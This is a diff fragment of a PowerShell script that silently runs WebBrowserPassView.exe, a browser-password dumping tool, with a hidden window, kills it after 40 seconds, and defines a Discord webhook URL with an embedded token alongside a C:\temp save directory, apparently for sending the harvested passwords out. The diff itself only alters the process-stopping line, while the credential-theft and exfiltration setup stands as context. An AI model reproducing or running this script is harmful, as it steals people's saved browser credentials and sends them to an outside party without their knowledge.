@@ -12,7 +12,7 @@ Start-Process -FilePath .\WebBrowserPassView.exe -Wait -WindowStyle Hidden
 
 Start-Sleep -Seconds 40
 
-Stop-Process -FilePath .\WebBrowserPassView.exe
+Stop-Process -Name "WebBrowserPassView.exe" -Force
 
 $hookurl='https://discord.com/api/webhooks/1180337343920615434/dPohBhRKx_M_MeRIEQQjdOsPTydHKpwg_Vt6nOJU2ZeREXnDfQXV08laAiP2I45nQLBj'
 $fileSaveDir = 'C:\temp'
